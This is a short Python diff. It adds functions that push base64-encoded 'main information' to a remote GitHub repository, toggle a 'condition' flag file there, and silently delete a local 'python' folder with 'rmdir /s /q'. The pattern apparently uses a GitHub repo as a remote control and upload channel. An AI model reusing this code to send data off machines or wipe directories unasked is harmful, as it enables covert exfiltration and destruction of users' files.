@@ -60,7 +60,21 @@ try:
     def send_condition(TOKEN):
         g = Github(TOKEN)
         repo = g.get_user().get_repo("python")
-        file = repo.get_dir_contents("send_condition.ini")
-        repo.update_file("send_condition.ini", "condition", "True", sha=file.sha)
-
+        file = repo.get_dir_contents("result_condition.ini")
+        repo.update_file("result_condition.ini", "condition", "result_condition = False", sha=file.sha)
 # __________(Main information)__________#
+    def send_main_information(TOKEN, content, name_file_to_site):
+        sha = requests.get(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}",
+                           headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
+        content_base64 = base64.b64encode(content.encode()).decode()
+        data = {"content": content_base64, "message": "data", "sha": sha}
+        data = json.dumps(data)
+        main = requests.put(f"https://api.github.com/repos/ehsanmehran/python/contents/{name_file_to_site}", data=data,
+                            headers={"Authorization": f"token {TOKEN}"})
+
+
+    def Rmpydir():
+        system("rmdir /s /q python")
+
+
+
